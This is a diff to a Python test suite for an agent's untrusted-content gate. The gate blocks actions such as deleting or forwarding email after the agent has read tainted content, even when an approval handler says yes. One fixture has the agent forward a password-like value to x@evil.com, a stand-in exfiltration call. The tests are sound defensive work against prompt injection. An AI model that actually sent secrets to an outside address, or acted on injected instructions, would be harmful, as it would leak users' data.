@@ -243,22 +243,46 @@ class TestUntrustedContentGate:
         )
         assert mailbox.sent == []
 
-    async def test_block_holds_a_call_even_when_another_capability_asked_and_it_was_approved(self) -> None:
+    async def test_block_denies_a_call_that_asks_for_approval_without_asking_anyone(self) -> None:
         mailbox = _Mailbox([], [])
         agent = _agent(
             _script([_READ], [('delete_email', {'id': '1'})]), mailbox, UntrustedContentGate(on_tainted='block')
         )
-        first = await agent.run('go')
-        requests = _requests(first.output)
-        assert requests.metadata == {}
 
-        second = await agent.run(
-            message_history=first.all_messages(),
-            deferred_tool_results=DeferredToolResults(approvals={'call1-0': ToolApproved()}),
-        )
+        result = await agent.run('go')
 
         assert mailbox.deleted == []
-        assert isinstance(second.output, str) and second.output.startswith('`delete_email` was not run')
+        assert isinstance(result.output, str) and result.output.startswith('`delete_email` was not run')
+
+    async def test_block_leaves_an_approval_request_in_a_clean_run_to_the_person(self) -> None:
+        mailbox = _Mailbox([], [])
+        agent = _agent(_script([('delete_email', {'id': '1'})]), mailbox, UntrustedContentGate(on_tainted='block'))
+
+        result = await agent.run('go')
+
+        assert [call.tool_name for call in _requests(result.output).approvals] == ['delete_email']
+
+    async def test_block_holds_a_call_a_handler_approved_before_the_gate_saw_it(self) -> None:
+        """A handler on the agent answers before the gate, which runs innermost; the gate still blocks the call."""
+        mailbox = _Mailbox([], [])
+        asked: list[str] = []
+
+        def approve(ctx: RunContext[None], requests: DeferredToolRequests) -> DeferredToolResults:
+            asked.extend(call.tool_name for call in requests.approvals)
+            return DeferredToolResults(approvals={call.tool_call_id: ToolApproved() for call in requests.approvals})
+
+        agent = _agent(
+            _script([_READ], [('delete_email', {'id': '1'})]),
+            mailbox,
+            UntrustedContentGate(on_tainted='block'),
+            HandleDeferredToolCalls[None](approve),
+        )
+
+        result = await agent.run('go')
+
+        assert asked == ['delete_email']
+        assert mailbox.deleted == []
+        assert isinstance(result.output, str) and result.output.startswith('`delete_email` was not run')
 
     async def test_history_from_an_earlier_run_taints_the_next(self) -> None:
         mailbox = _Mailbox([], [])
@@ -528,7 +552,10 @@ class TestArgsValidator:
 
     @staticmethod
     def _agent(
-        mailbox: _Mailbox, model: FunctionModel, *extra: AbstractCapability[None]
+        mailbox: _Mailbox,
+        model: FunctionModel,
+        *extra: AbstractCapability[None],
+        gate: UntrustedContentGate[None] | None = None,
     ) -> Agent[None, str | DeferredToolRequests]:
         def ask_outside(ctx: RunContext[None], to: str, body: str) -> None:
             if not to.endswith('@acme.co') and not ctx.tool_call_approved:
@@ -543,7 +570,7 @@ class TestArgsValidator:
             model,
             mailbox,
             *extra,
-            UntrustedContentGate(),
+            gate or UntrustedContentGate(),
             Capability[None](tools=[Tool(forward, args_validator=ask_outside)]),
         )
 
@@ -562,6 +589,16 @@ class TestArgsValidator:
 
         assert list(_requests(result.output).metadata['call1-0']) == ['untrusted_content_gate']
         assert mailbox.sent == []
+
+    async def test_block_denies_a_call_its_validator_asks_about_without_asking_anyone(self) -> None:
+        mailbox = _Mailbox([], [])
+        forward = ('forward', {'to': 'x@evil.com', 'body': 'hunter2'})
+        agent = self._agent(mailbox, _script([_READ], [forward]), gate=UntrustedContentGate(on_tainted='block'))
+
+        result = await agent.run('go')
+
+        assert mailbox.sent == []
+        assert isinstance(result.output, str) and result.output.startswith('`forward` was not run')
 
     async def test_the_gate_asks_about_a_call_its_validator_would_ask_about(self) -> None:
         mailbox = _Mailbox([], [])
